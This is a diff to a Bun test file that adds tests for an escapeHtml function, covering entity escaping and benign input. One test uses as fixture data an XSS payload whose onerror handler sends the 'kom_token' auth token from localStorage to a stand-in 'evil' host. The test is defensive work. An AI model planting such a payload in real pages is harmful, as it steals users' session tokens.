@@ -1,5 +1,11 @@
 import { describe, it, expect, setSystemTime } from "bun:test";
-import { formatTime, formatDistance, parseJwt, isTokenExpired } from "./utils";
+import {
+  formatTime,
+  formatDistance,
+  parseJwt,
+  isTokenExpired,
+  escapeHtml,
+} from "./utils";
 
 describe("formatTime", () => {
   it("formats zero as 0:00", () => {
@@ -91,5 +97,30 @@ describe("isTokenExpired", () => {
     } finally {
       setSystemTime();
     }
+  });
+});
+
+describe("escapeHtml", () => {
+  it("neutralizes an XSS payload from an untrusted segment name", () => {
+    const payload = `<img src=x onerror="fetch('//evil/?t='+localStorage.getItem('kom_token'))">`;
+    const escaped = escapeHtml(payload);
+    expect(escaped).not.toContain("<img");
+    expect(escaped).not.toContain("onerror=\"");
+    expect(escaped).toContain("&lt;img");
+  });
+
+  it("escapes all five HTML-significant characters", () => {
+    expect(escapeHtml(`&<>"'`)).toBe("&amp;&lt;&gt;&quot;&#39;");
+  });
+
+  it("escapes ampersand before other entities (no double-escaping order bug)", () => {
+    expect(escapeHtml("<")).toBe("&lt;");
+    expect(escapeHtml("Tom & Jerry")).toBe("Tom &amp; Jerry");
+  });
+
+  it("leaves a benign name unchanged", () => {
+    expect(escapeHtml("Côte de la Butte Montmartre")).toBe(
+      "Côte de la Butte Montmartre"
+    );
   });
 });
